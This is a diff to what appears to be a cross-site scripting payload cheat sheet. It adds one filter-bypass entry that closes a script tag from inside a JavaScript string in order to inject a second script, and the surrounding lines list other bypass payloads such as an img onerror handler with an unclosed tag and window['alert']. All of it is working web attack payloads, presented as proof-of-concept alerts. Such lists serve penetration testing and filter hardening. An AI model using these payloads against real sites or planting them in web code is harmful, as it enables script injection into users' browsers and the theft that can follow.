@@ -294,6 +294,14 @@ Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
 <img src='1' onerror='alert(0)' <
 ```
 
+
+Bypass using javascript inside a string
+```
+<script>
+foo="text </script><script>alert(1)</script>";
+</script>
+```
+
 Bypass using an alternate way to execute an alert
 ```
 <script>window['alert'](0)</script>
